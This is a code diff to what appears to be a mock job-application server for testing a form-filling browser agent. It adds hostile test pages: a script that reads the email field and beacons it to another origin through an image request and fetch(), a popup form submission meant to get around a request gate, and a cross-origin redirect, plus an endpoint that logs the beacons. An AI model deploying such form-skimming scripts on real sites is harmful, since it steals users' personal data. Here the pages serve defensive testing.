@@ -32,6 +32,7 @@ DEFAULT_QUESTIONS = [
 
 app = FastAPI(title="Mock application site", docs_url=None, redoc_url=None, openapi_url=None)
 SUBMISSIONS: list[dict[str, Any]] = []
+BEACONS: list[str] = []  # data a hostile page tried to send out
 QUESTIONS: dict[str, list[tuple[str, str, bool]]] = {}
 _references = itertools.count(1001)
 
@@ -53,9 +54,8 @@ def _field(field_id: str, label: str, required: bool, control: str) -> str:
 
 
 def _input(field_id: str, required: bool, kind: str = "text") -> str:
-    return (
-        f"<input id='{field_id}' name='{field_id}' type='{kind}'{' required' if required else ''}>"
-    )
+    fid = html.escape(field_id, quote=True)
+    return f"<input id='{fid}' name='{fid}' type='{kind}'{' required' if required else ''}>"
 
 
 def application_form(slug: str, extra: str = "") -> str:
@@ -177,6 +177,45 @@ async def apply_that_submits_itself(slug: str) -> HTMLResponse:
     return _page(f"Apply: {slug}", application_form(slug) + script)
 
 
+@app.get("/exfil/{slug}/apply", response_class=HTMLResponse)
+async def apply_that_leaks(slug: str, request: Request) -> HTMLResponse:
+    """Reads the filled form and sends it to another origin (here: this server under its
+    other name, so the attempt is observable)."""
+    other = "localhost" if request.url.hostname == "127.0.0.1" else "127.0.0.1"
+    beacon = f"http://{other}:{request.url.port}/__beacon"
+    script = (
+        "<script>setInterval(() => { const v = document.getElementById('email').value;"
+        f"if (v) {{ new Image().src = '{beacon}?email=' + encodeURIComponent(v);"
+        f"fetch('{beacon}?via=fetch&email=' + encodeURIComponent(v)).catch(() => {{}}); }}"
+        "}, 20);</script>"
+    )
+    return _page(f"Apply: {slug}", application_form(slug) + script)
+
+
+@app.get("/popup/{slug}/apply", response_class=HTMLResponse)
+async def apply_with_popup(slug: str) -> HTMLResponse:
+    """Opens a window that posts the form, to get around the page's request gate."""
+    script = (
+        "<script>window.addEventListener('load', () => setTimeout(() => {"
+        "const w = window.open('about:blank', 'exfil');"
+        "const f = document.getElementById('application'); f.target = 'exfil';"
+        "HTMLFormElement.prototype.submit.call(f); }, 50));</script>"
+    )
+    return _page(f"Apply: {slug}", application_form(slug) + script)
+
+
+@app.get("/redirect/{slug}/apply")
+async def apply_redirects_elsewhere(slug: str, request: Request) -> RedirectResponse:
+    other = "localhost" if request.url.hostname == "127.0.0.1" else "127.0.0.1"
+    return RedirectResponse(f"http://{other}:{request.url.port}/jobs/{slug}/apply", 302)
+
+
+@app.get("/__beacon")
+async def beacon(request: Request) -> JSONResponse:
+    BEACONS.append(str(request.url.query))
+    return JSONResponse({"ok": True})
+
+
 @app.post("/jobs/{slug}/submit", response_class=HTMLResponse)
 async def submit(slug: str, request: Request) -> HTMLResponse:
     fields: dict[str, str] = {}
@@ -210,6 +249,7 @@ async def list_submissions() -> JSONResponse:
 async def clear_submissions() -> JSONResponse:
     SUBMISSIONS.clear()
     QUESTIONS.clear()
+    BEACONS.clear()
     return JSONResponse({"cleared": True})
 
 
